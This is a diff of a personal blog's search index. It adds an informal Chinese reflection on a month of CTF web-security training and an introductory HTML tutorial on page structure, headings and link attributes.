@@ -605,6 +605,68 @@ bkcrack -C flag.zip -c flag.png -p png_header -o 0</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>AyaN0桑的集训阶段总结</title>
+    <url>/2025/08/02/AyaN0%E6%A1%91%E7%9A%84%E9%9B%86%E8%AE%AD%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h1 id="集训总结"><a class="markdownIt-Anchor" href="#集训总结"></a> 集训总结</h1>
+<p>想想一个月学了什么呢。</p>
+<p>好像学了很多，好像又没学到什么。(因为NepCTF被锤烂了啊草)</p>
+<p>简单的总结一下学到的东西吧。</p>
+<h2 id="渗透"><a class="markdownIt-Anchor" href="#渗透"></a> 渗透</h2>
+<p>学到了什么。。</p>
+<p>好像就会了搭代理，扫端口，查资产</p>
+<p>总之没怎么学，只有老登讲课的那几次学了点进去来着</p>
+<p>八月再说吧唉…</p>
+<h2 id="php时代的结束"><a class="markdownIt-Anchor" href="#php时代的结束"></a> PHP时代的结束</h2>
+<p>总算把PHP的知识点补完了。虽然中途跑出来的R3CTF又把我锤烂了(想到了heredoc不知道怎么写poc…DIRECTORY_SEPARATOR是什么?我不到啊)</p>
+<p>还借着补完原生类的功夫把CRLF和HTTP请求走私，发现自己对HTTP协议好像真的有点不太了解啊。。</p>
+<p>但是真结束了吗?我看并非</p>
+<p>以后大概还是要不断补坑的</p>
+<h2 id="奇奇怪怪的其他语言"><a class="markdownIt-Anchor" href="#奇奇怪怪的其他语言"></a> 奇奇怪怪的其他语言</h2>
+<p>春秋杯遇到了ruby，之后就随便学了点其他的语言</p>
+<p>像Ruby,Go这些</p>
+<p>Go的题目还没接触过，接触到了再深入学吧，ruby的题目少，知识点也少，倒是没太大所谓</p>
+<h2 id="更多更多的框架"><a class="markdownIt-Anchor" href="#更多更多的框架"></a> 更多更多的框架</h2>
+<p>PHP的Yii，没遇到过…Laravel？不认识</p>
+<p>Python的sanic是什么?pyramid又是啥?</p>
+<p>哎呦我，怎么什么都不知道啊🖐️😭🖐️</p>
+<p>最飞舞的一集</p>
+<h2 id="js苦手"><a class="markdownIt-Anchor" href="#js苦手"></a> 《JS苦手》</h2>
+<p>原型链?哦会的会的</p>
+<p>vm沙箱?哦应该会的会的</p>
+<p>XSS?我草拟吗带着你的一堆购机吧标签给我滚出去😡</p>
+<h2 id="java大时代要来力"><a class="markdownIt-Anchor" href="#java大时代要来力"></a> Java大时代要来力</h2>
+<p>Nep偶遇三道Java题，拼尽全力战胜(但是说实话是签到题吧呐)</p>
+<p>感觉是应该学Java了啊，毕竟Go和Ruby偶尔上桌，这位可是天天上桌</p>
+<p>一听到其他师傅在研究各种冷门的神秘链子已经吓哭了。。</p>
+<h2 id="你真的懂数据库吗"><a class="markdownIt-Anchor" href="#你真的懂数据库吗"></a> 你真的懂数据库吗</h2>
+<p>感觉数据库好多，好像随便揪一个出来都可以出题。</p>
+<p>学了一点Redis和MongoDB这种NoSQL</p>
+<p>结果月末被Nep的<code>clickhouse</code>SQL注入给打爆了</p>
+<p>这辈子不敢说自己会SQL注入了。</p>
+<p>感觉应该就学了这些吧，一个月的时间，也不敢说自己掌握的有多深入</p>
+<p>希望队内赛不会爆零吧。。也不知道老登的葫芦里卖的什么药</p>
+<p>感觉自己最欠缺的应该是反序列化这块吧。链子什么的看不懂啦…</p>
+<h2 id="败北的ayan0"><a class="markdownIt-Anchor" href="#败北的ayan0"></a> 败北的AyaN0</h2>
+<p>忘记发布了，等到看到这个队内赛已经打完了，爆零了哈哈。。</p>
+<p>强度确实不够看了，现在仔细看看自己上面列的这些东西感觉有点像笑话</p>
+<p>还是太心急了吗。。真正碰到比赛才知道自己只是学了个知识点，怎么打都是一知半解，又没有自己的思路</p>
+<p>唉唉，要好好反思自己，好在后续成功复现了，还是多种方法去打，不学的深入一点还真是没办法上桌的，简直是会员制餐厅里端上来的一个一个雪(难视)</p>
+<p>好题目也可以多自己研究一下啊感觉(这次队内赛的题目感觉都挺好的，全是我掌握的不全面的东西。。)</p>
+<p>但是讲实话，队内赛结束 那个晚上到1点才睡着，和老同学也聊了好久，怀疑过自己适不适合打web，适不适合继续打CTF，质疑过自己的能力</p>
+<p>但是就算没有才能又如何呢。。坚定不移的走自己喜欢的道路就好了</p>
+<p>额，但是你怎么知道我昨天单抽两个up😋</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250802125708921.png" alt="image-20250802125708921"></p>
+<p>和<s>老班长</s>义父的相谈</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250802125911183.png" alt="image-20250802125911183"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250802125924247.png" alt="image-20250802125924247"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250802130053483.png" alt="image-20250802130053483"></p>
+<p>19发单抽拿下当期2个up嘻嘻，爽赤了</p>
+]]></content>
+      <tags>
+        <tag>-随笔</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUU—MISC刷题记录</title>
     <url>/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<p>浅浅记录一下BUU里感觉比较有价值的题目</p>
@@ -769,68 +831,6 @@ plt.show()</code></pre>
       </categories>
       <tags>
         <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>AyaN0桑的集训阶段总结</title>
-    <url>/2025/08/02/AyaN0%E6%A1%91%E7%9A%84%E9%9B%86%E8%AE%AD%E9%98%B6%E6%AE%B5%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<h1 id="集训总结"><a class="markdownIt-Anchor" href="#集训总结"></a> 集训总结</h1>
-<p>想想一个月学了什么呢。</p>
-<p>好像学了很多，好像又没学到什么。(因为NepCTF被锤烂了啊草)</p>
-<p>简单的总结一下学到的东西吧。</p>
-<h2 id="渗透"><a class="markdownIt-Anchor" href="#渗透"></a> 渗透</h2>
-<p>学到了什么。。</p>
-<p>好像就会了搭代理，扫端口，查资产</p>
-<p>总之没怎么学，只有老登讲课的那几次学了点进去来着</p>
-<p>八月再说吧唉…</p>
-<h2 id="php时代的结束"><a class="markdownIt-Anchor" href="#php时代的结束"></a> PHP时代的结束</h2>
-<p>总算把PHP的知识点补完了。虽然中途跑出来的R3CTF又把我锤烂了(想到了heredoc不知道怎么写poc…DIRECTORY_SEPARATOR是什么?我不到啊)</p>
-<p>还借着补完原生类的功夫把CRLF和HTTP请求走私，发现自己对HTTP协议好像真的有点不太了解啊。。</p>
-<p>但是真结束了吗?我看并非</p>
-<p>以后大概还是要不断补坑的</p>
-<h2 id="奇奇怪怪的其他语言"><a class="markdownIt-Anchor" href="#奇奇怪怪的其他语言"></a> 奇奇怪怪的其他语言</h2>
-<p>春秋杯遇到了ruby，之后就随便学了点其他的语言</p>
-<p>像Ruby,Go这些</p>
-<p>Go的题目还没接触过，接触到了再深入学吧，ruby的题目少，知识点也少，倒是没太大所谓</p>
-<h2 id="更多更多的框架"><a class="markdownIt-Anchor" href="#更多更多的框架"></a> 更多更多的框架</h2>
-<p>PHP的Yii，没遇到过…Laravel？不认识</p>
-<p>Python的sanic是什么?pyramid又是啥?</p>
-<p>哎呦我，怎么什么都不知道啊🖐️😭🖐️</p>
-<p>最飞舞的一集</p>
-<h2 id="js苦手"><a class="markdownIt-Anchor" href="#js苦手"></a> 《JS苦手》</h2>
-<p>原型链?哦会的会的</p>
-<p>vm沙箱?哦应该会的会的</p>
-<p>XSS?我草拟吗带着你的一堆购机吧标签给我滚出去😡</p>
-<h2 id="java大时代要来力"><a class="markdownIt-Anchor" href="#java大时代要来力"></a> Java大时代要来力</h2>
-<p>Nep偶遇三道Java题，拼尽全力战胜(但是说实话是签到题吧呐)</p>
-<p>感觉是应该学Java了啊，毕竟Go和Ruby偶尔上桌，这位可是天天上桌</p>
-<p>一听到其他师傅在研究各种冷门的神秘链子已经吓哭了。。</p>
-<h2 id="你真的懂数据库吗"><a class="markdownIt-Anchor" href="#你真的懂数据库吗"></a> 你真的懂数据库吗</h2>
-<p>感觉数据库好多，好像随便揪一个出来都可以出题。</p>
-<p>学了一点Redis和MongoDB这种NoSQL</p>
-<p>结果月末被Nep的<code>clickhouse</code>SQL注入给打爆了</p>
-<p>这辈子不敢说自己会SQL注入了。</p>
-<p>感觉应该就学了这些吧，一个月的时间，也不敢说自己掌握的有多深入</p>
-<p>希望队内赛不会爆零吧。。也不知道老登的葫芦里卖的什么药</p>
-<p>感觉自己最欠缺的应该是反序列化这块吧。链子什么的看不懂啦…</p>
-<h2 id="败北的ayan0"><a class="markdownIt-Anchor" href="#败北的ayan0"></a> 败北的AyaN0</h2>
-<p>忘记发布了，等到看到这个队内赛已经打完了，爆零了哈哈。。</p>
-<p>强度确实不够看了，现在仔细看看自己上面列的这些东西感觉有点像笑话</p>
-<p>还是太心急了吗。。真正碰到比赛才知道自己只是学了个知识点，怎么打都是一知半解，又没有自己的思路</p>
-<p>唉唉，要好好反思自己，好在后续成功复现了，还是多种方法去打，不学的深入一点还真是没办法上桌的，简直是会员制餐厅里端上来的一个一个雪(难视)</p>
-<p>好题目也可以多自己研究一下啊感觉(这次队内赛的题目感觉都挺好的，全是我掌握的不全面的东西。。)</p>
-<p>但是讲实话，队内赛结束 那个晚上到1点才睡着，和老同学也聊了好久，怀疑过自己适不适合打web，适不适合继续打CTF，质疑过自己的能力</p>
-<p>但是就算没有才能又如何呢。。坚定不移的走自己喜欢的道路就好了</p>
-<p>额，但是你怎么知道我昨天单抽两个up😋</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250802125708921.png" alt="image-20250802125708921"></p>
-<p>和<s>老班长</s>义父的相谈</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250802125911183.png" alt="image-20250802125911183"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250802125924247.png" alt="image-20250802125924247"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250802130053483.png" alt="image-20250802130053483"></p>
-<p>19发单抽拿下当期2个up嘻嘻，爽赤了</p>
-]]></content>
-      <tags>
-        <tag>-随笔</tag>
       </tags>
   </entry>
   <entry>
@@ -1463,6 +1463,883 @@ save
 ]]></content>
       <tags>
         <tag>-Web -HTTP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTML学习以及网页搭建初实践</title>
+    <url>/2025/03/30/HTML%E5%AD%A6%E4%B9%A0%E4%BB%A5%E5%8F%8A%E7%BD%91%E9%A1%B5%E6%90%AD%E5%BB%BA%E5%88%9D%E5%AE%9E%E8%B7%B5/</url>
+    <content><![CDATA[<h1 id="html学习以及网页搭建初实践"><a class="markdownIt-Anchor" href="#html学习以及网页搭建初实践"></a> HTML学习以及网页搭建初实践</h1>
+<p>学XSS一大家子时发现前端不仔细了解一下学习很难进行下去啊，于是就想先简单学习一下html来做一个铺垫</p>
+<h2 id="html实例的基本结构"><a class="markdownIt-Anchor" href="#html实例的基本结构"></a> HTML实例的基本结构</h2>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/02A7DD95-22B4-4FB9-B994-DDB5393F7F03.jpg" alt="02A7DD95-22B4-4FB9-B994-DDB5393F7F03"></p>
+<ul>
+<li><strong><!DOCTYPE html></strong> 声明为 HTML5 文档</li>
+<li><strong><html></html></strong> 元素是 HTML 页面的根元素</li>
+<li><strong><head></head></strong> 元素包含了文档的元（meta）数据，如 <strong><meta charset="utf-8"></strong> 定义网页编码格式为 <strong>utf-8</strong>。</li>
+<li><strong><title></title></strong> 元素描述了文档的标题</li>
+<li><strong><body></body></strong> 元素包含了可见的页面内容</li>
+<li><strong><h1></h1></strong> 元素定义一个大标题</li>
+<li><strong><p></p></strong> 元素定义一个段落</li>
+</ul>
+<p>其实F12查一下源代码就能知道是大致怎么样个结构</p>
+<h2 id="什么是-html"><a class="markdownIt-Anchor" href="#什么是-html"></a> 什么是 HTML?</h2>
+<p>HTML 是用来描述网页的一种语言。</p>
+<ul>
+<li>HTML 指的是超文本标记语言: <strong>H</strong>yper<strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage</li>
+<li>HTML 不是一种编程语言，而是一种<strong>标记</strong>语言</li>
+<li>标记语言是一套<strong>标记标签</strong> (markup tag)</li>
+<li>HTML 使用标记标签来<strong>描述</strong>网页</li>
+<li>HTML 文档包含了HTML <strong>标签</strong>及<strong>文本</strong>内容</li>
+<li>HTML文档也叫做 <strong>web 页面</strong></li>
+</ul>
+<h2 id="html-标签"><a class="markdownIt-Anchor" href="#html-标签"></a> HTML 标签</h2>
+<p>HTML 标记标签通常被称为 HTML 标签 (HTML tag)。</p>
+<ul>
+<li>HTML 标签是由<em>尖括号</em>包围的关键词，比如 <html></html></li>
+<li>HTML 标签通常是<em>成对出现</em>的，比如 <b> 和 </b></li>
+<li>标签对中的第一个标签是<em>开始标签</em>，第二个标签是<em>结束标签</em></li>
+<li>开始和结束标签也被称为<em>开放标签</em>和<em>闭合标签</em></li>
+</ul>
+<p>&lt;标签&gt;内容&lt;/标签&gt;</p>
+<hr>
+<h2 id="html-元素"><a class="markdownIt-Anchor" href="#html-元素"></a> HTML 元素</h2>
+<p>“HTML 标签” 和 “HTML 元素” 通常都是描述同样的意思.</p>
+<p>但是严格来讲, 一个 HTML 元素包含了开始标签与结束标签，如下实例:</p>
+<p>HTML 元素:</p>
+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>
+<h3 id="div"><a class="markdownIt-Anchor" href="#div"></a> <code>&lt;div&gt;</code></h3>
+<p>内容划分元素，通过div与class的搭配轻松将页面划分为多个不同模块</p>
+<h3 id="a"><a class="markdownIt-Anchor" href="#a"></a> <code>&lt;a&gt;</code></h3>
+<p>锚元素，通过其的herf属性来引用其他网页/本地的文件</p>
+<ul>
+<li>
+<p>实例</p>
+<pre><code class="highlight plaintext">&lt;a href=&quot;https://www.mozilla.com&quot;&gt; Mozilla &lt;/a&gt; 
+//绝对地址引用
+&lt;a href=&quot;//example.com&quot;&gt;相对于协议的 URL&lt;/a&gt;
+&lt;a href=&quot;/zh-CN/docs/Web/HTML&quot;&gt;相对于源的 URL&lt;/a&gt;
+&lt;a href=&quot;./p&quot;&gt;相对于路径的 URL&lt;/a&gt;
+//相对地址的链接
+&lt;!-- &lt;a&gt; 元素链接到下面部分 --&gt;
+&lt;p&gt;&lt;a href=&quot;#Section_further_down&quot;&gt; 跳转到下方标题 &lt;/a&gt;&lt;/p&gt;
+
+&lt;!-- 要链接到的标题 --&gt;
+&lt;h2 id=&quot;Section_further_down&quot;&gt;更下面的部分&lt;/h2&gt;
+//同页面链接</code></pre>
+<p>当然，你也可以将<code>&lt;a&gt;</code>插入在段落中达到引用的效果</p>
+<h3 id="待补全中"><a class="markdownIt-Anchor" href="#待补全中"></a> (待补全中。。。)</h3>
+</li>
+</ul>
+<h2 id="网页结构"><a class="markdownIt-Anchor" href="#网页结构"></a> 网页结构</h2>
+<p>一般分为head和body</p>
+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">html</span>&gt;</span>
+	<span class="tag">&lt;<span class="name">head</span>&gt;</span>
+    	<span class="tag">&lt;<span class="name">title</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span>
+	<span class="tag">&lt;/<span class="name">head</span>&gt;</span>
+	<span class="tag">&lt;<span class="name">body</span>&gt;</span>
+        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>小标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>
+        <span class="tag">&lt;<span class="name">p</span>&gt;</span>正文<span class="tag">&lt;/<span class="name">p</span>&gt;</span>
+    <span class="tag">&lt;/<span class="name">body</span>&gt;</span>
+<span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre>
+<p>只有body部分会在网页中显示</p>
+<h2 id="html版本"><a class="markdownIt-Anchor" href="#html版本"></a> HTML版本</h2>
+<p>从初期的网络诞生后，已经出现了许多HTML版本:</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">版本</th>
+<th style="text-align:left">发布时间</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">HTML</td>
+<td style="text-align:left">1991</td>
+</tr>
+<tr>
+<td style="text-align:left">HTML+</td>
+<td style="text-align:left">1993</td>
+</tr>
+<tr>
+<td style="text-align:left">HTML 2.0</td>
+<td style="text-align:left">1995</td>
+</tr>
+<tr>
+<td style="text-align:left">HTML 3.2</td>
+<td style="text-align:left">1997</td>
+</tr>
+<tr>
+<td style="text-align:left">HTML 4.01</td>
+<td style="text-align:left">1999</td>
+</tr>
+<tr>
+<td style="text-align:left">XHTML 1.0</td>
+<td style="text-align:left">2000</td>
+</tr>
+<tr>
+<td style="text-align:left">HTML5</td>
+<td style="text-align:left">2012</td>
+</tr>
+<tr>
+<td style="text-align:left">XHTML5</td>
+<td style="text-align:left">2013</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2 id="doctype-声明"><a class="markdownIt-Anchor" href="#doctype-声明"></a> &lt;!DOCTYPE&gt; 声明</h2>
+<!DOCTYPE>声明有助于浏览器中正确显示网页。
+<p>网络上有很多不同的文件，如果能够正确声明HTML的版本，浏览器就能正确显示网页内容。</p>
+<p>doctype 声明是不区分大小写的，以下方式均可：</p>
+<pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>
+
+<span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span>
+
+<span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span>
+
+<span class="meta">&lt;!Doctype <span class="keyword">Html</span>&gt;</span></code></pre>
+<hr>
+<h2 id="通用声明"><a class="markdownIt-Anchor" href="#通用声明"></a> 通用声明</h2>
+<h3 id="html5"><a class="markdownIt-Anchor" href="#html5"></a> HTML5</h3>
+<pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></code></pre>
+<h3 id="html-401"><a class="markdownIt-Anchor" href="#html-401"></a> HTML 4.01</h3>
+<pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span></span>
+<span class="meta"><span class="string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span></code></pre>
+<h3 id="xhtml-10"><a class="markdownIt-Anchor" href="#xhtml-10"></a> XHTML 1.0</h3>
+<pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span></span>
+<span class="meta"><span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span></code></pre>
+<p>查看完整网页声明类型 <a href="https://www.runoob.com/tags/tag-doctype.html">DOCTYPE 参考手册</a>。</p>
+<hr>
+<h2 id="中文编码"><a class="markdownIt-Anchor" href="#中文编码"></a> 中文编码</h2>
+<p>目前在大部分浏览器中，直接输出中文会出现中文乱码的情况，这时候我们就需要在头部将字符声明为 UTF-8 或 GBK。</p>
+<h2 id="html-实例"><a class="markdownIt-Anchor" href="#html-实例"></a> HTML 实例</h2>
+<p>自己尝试了一下，大概这个效果。?</p>
+<pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>
+<span class="tag">&lt;<span class="name">html</span>&gt;</span>
+<span class="tag">&lt;<span class="name">head</span>&gt;</span> 
+<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>
+<span class="tag">&lt;<span class="name">title</span>&gt;</span>哼哼哼，你也要来下北泽和我一辈子红茶吗<span class="tag">&lt;/<span class="name">title</span>&gt;</span>
+<span class="tag">&lt;/<span class="name">head</span>&gt;</span>
+<span class="tag">&lt;<span class="name">body</span>&gt;</span>
+<span class="tag">&lt;<span class="name">h1</span>&gt;</span> 什么，你的意思是说愿意和我一起看一个一个林擒吗<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>
+
+	<span class="tag">&lt;<span class="name">p</span>&gt;</span>哼哼哼，啊啊啊啊啊啊啊啊啊(指发自内心的高兴嚎叫<span class="tag">&lt;/<span class="name">p</span>&gt;</span>
+<span class="tag">&lt;/<span class="name">body</span>&gt;</span>
+<span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250316090224855.png" alt="image-20250316090224855"></p>
+<pre><code class="highlight html"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span> <span class="tag">&lt;<span class="name">html</span>&gt;</span> <span class="tag">&lt;<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">title</span>&gt;</span> 页面标题<span class="tag">&lt;/<span class="name">title</span>&gt;</span> <span class="tag">&lt;/<span class="name">head</span>&gt;</span> <span class="tag">&lt;<span class="name">body</span>&gt;</span>  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>我的第一个标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>  <span class="tag">&lt;<span class="name">p</span>&gt;</span>我的第一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span>  <span class="tag">&lt;/<span class="name">body</span>&gt;</span> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></code></pre>
+<h2 id="更加完善的结构"><a class="markdownIt-Anchor" href="#更加完善的结构"></a> 更加完善的结构</h2>
+<p><em><strong><strong>开始标签(无/)常被称为</strong>起始标签（opening tag）</strong>，结束标签(有/)常称为</em><em>闭合标签（closing tag）</em>*</p>
+<h3 id="html-标题"><a class="markdownIt-Anchor" href="#html-标题"></a> <strong>HTML 标题</strong></h3>
+<p>HTML 标题（Heading）是通过<code>&lt;h1&gt; - &lt;h6&gt;</code> 标签来定义的。从1-6标题的大小逐步减小(和markdown的几级标题应该是一个道理)</p>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>
+<span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&quot;6&quot;</span>&gt;</span>这是6号字体文本<span class="tag">&lt;/<span class="name">font</span>&gt;</span>
+<span class="comment">&lt;!--size和h1,h2这些一一对应--&gt;</span>
+<span class="tag">&lt;<span class="name">h2</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h2</span>&gt;</span>
+<span class="tag">&lt;<span class="name">h3</span>&gt;</span>这是一个标题<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></code></pre>
+<p>请确保将 HTML 标题 标签只用于标题。不要仅仅是为了生成<strong>粗体</strong>或<strong>大号</strong>的文本而使用标题。</p>
+<p>搜索引擎使用标题为您的网页的结构和内容编制索引。</p>
+<p>因为用户可以通过标题来快速浏览您的网页，所以用标题来呈现文档结构是很重要的。</p>
+<p>应该将 h1 用作主标题（最重要的），其后是 h2（次重要的），再其次是 h3，以此类推。</p>
+<hr>
+<h3 id="html-段落"><a class="markdownIt-Anchor" href="#html-段落"></a> <strong>HTML 段落</strong></h3>
+<p>HTML 段落是通过标签 <code>&lt;p&gt;</code> 来定义的。</p>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span> <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是另外一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>
+<hr>
+<h3 id="html-链接"><a class="markdownIt-Anchor" href="#html-链接"></a> <strong>HTML 链接</strong></h3>
+<p>HTML 链接是通过标签<code> &lt;a&gt;</code> 来定义的。</p>
+<p>HTML 链接（Anchor）是网页之间跳转的核心部分。</p>
+<p>HTML 使用链接与网络上的另一个文档相连。</p>
+<p>HTML中的链接是一种用于在不同网页之间导航的元素。</p>
+<p>链接通常用于将一个网页与另一个网页或资源（如文档、图像、音频文件等）相关联。</p>
+<p>链接允许用户在浏览网页时单击文本或图像来跳转到其他位置，从而实现网页之间的互联。</p>
+<p>HTML 链接 通过标签创建，通常用于将用户从一个页面导航到另一个页面、从一个部分跳转到页面中的另一个部分、下载文件、打开电子邮件应用程序或执行 JavaScript 函数等。</p>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.runoob.com&quot;</span>&gt;</span>这是一个链接<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre>
+<p>**提示:**在 href 属性中指定链接的地址。</p>
+<h4 id="基本语法"><a class="markdownIt-Anchor" href="#基本语法"></a> 基本语法</h4>
+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;URL&quot;</span>&gt;</span>链接文本<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre>
+<ul>
+<li><code>&lt;a&gt;</code> 标签：定义了一个超链接（anchor）。它是 HTML 中用来创建可点击链接的主要标签。</li>
+<li><code>href</code> 属性：指定目标 URL，当点击链接时，浏览器将导航到此 URL。</li>
+</ul>
+<p>以下实例演示来如何在 HTML 文档中创建链接：</p>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">p</span>&gt;</span>
+<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/index.html&quot;</span>&gt;</span>本文本<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 是一个指向本网站中的一个页面的链接。<span class="tag">&lt;/<span class="name">p</span>&gt;</span>
+<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.microsoft.com/&quot;</span>&gt;</span>本文本<span class="tag">&lt;/<span class="name">a</span>&gt;</span> 是一个指向万维网上的页面的链接。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></code></pre>
+<hr>
+<h4 id="html-超链接链接"><a class="markdownIt-Anchor" href="#html-超链接链接"></a> HTML 超链接（链接）</h4>
+<p>HTML使用标签 <code>&lt;a&gt;</code> 来设置超文本链接。</p>
+<p>超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，您可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。</p>
+<p>当您把鼠标指针移动到网页中的某个链接上时，箭头会变为一只小手。</p>
+<p>在标签 <code>&lt;a&gt;</code> 中使用了<code> href</code> 属性来描述链接的地址。</p>
+<p>默认情况下，链接将以以下形式出现在浏览器中：</p>
+<ul>
+<li>一个未访问过的链接显示为蓝色字体并带有下划线。</li>
+<li>访问过的链接显示为紫色并带有下划线。</li>
+<li>点击链接时，链接显示为红色并带有下划线。</li>
+</ul>
+<blockquote>
+<p>注意：如果为这些超链接设置了 CSS 样式，展示样式会根据 CSS 的设定而显示。</p>
+</blockquote>
+<hr>
+<h4 id="html-链接属性"><a class="markdownIt-Anchor" href="#html-链接属性"></a> HTML 链接属性</h4>
+<p><code>href </code>属性描述了链接的目标。</p>
+<h5 id="href定义链接目标"><a class="markdownIt-Anchor" href="#href定义链接目标"></a> href：定义链接目标。</h5>
+<p>这是超链接最重要的属性，用来指定链接的目的地，可以是另一个网页、文件、邮件、电话号码或 JavaScript。</p>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.example.com&quot;</span>&gt;</span>访问 Example<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre>
+<h5 id="target定义链接的打开方式"><a class="markdownIt-Anchor" href="#target定义链接的打开方式"></a> target：定义链接的打开方式。</h5>
+<ul>
+<li><code>_blank</code>: 在新窗口或新标签页中打开链接。</li>
+<li><code>_self</code>: 在当前窗口或标签页中打开链接（默认）。</li>
+<li><code>_parent</code>: 在父框架中打开链接。//后续会了解到</li>
+<li><code>_top</code>: 在整个窗口中打开链接，取消任何框架。//后续会了解到</li>
+</ul>
+<ul>
+<li>实例</li>
+</ul>
+<pre><code class="highlight html"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.example.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;noopener&quot;</span>&gt;</span>新窗口打开 Example<span class="tag">&lt;/<span class="name">a</span>&gt;</span></code></pre>
+<h5 id="rel定义链接与目标页面的关系"><a class="markdownIt-Anchor" href="#rel定义链接与目标页面的关系"></a> rel：定义链接与目标页面的关系。</h5>
+<p><strong><code>nofollow</code></strong>: 表示搜索引擎不应跟踪该链接，常用于外部链接。</p>
+<p><strong><code>noopener</code></strong> 和 <strong><code>noreferrer</code></strong>: 防止在新标签中打开链接时的安全问题，尤其是使用 <strong>target=“_blank”</strong> 时。</p>
+<ul>
+<li><code>noopener</code>: 防止新的浏览上下文（页面）访问<code>window.opener</code>属性和<code>open</code>方法。</li>
+<li><code>noreferrer</code>: 不发送referer header（即不告诉目标网站你从哪里来的）。</li>
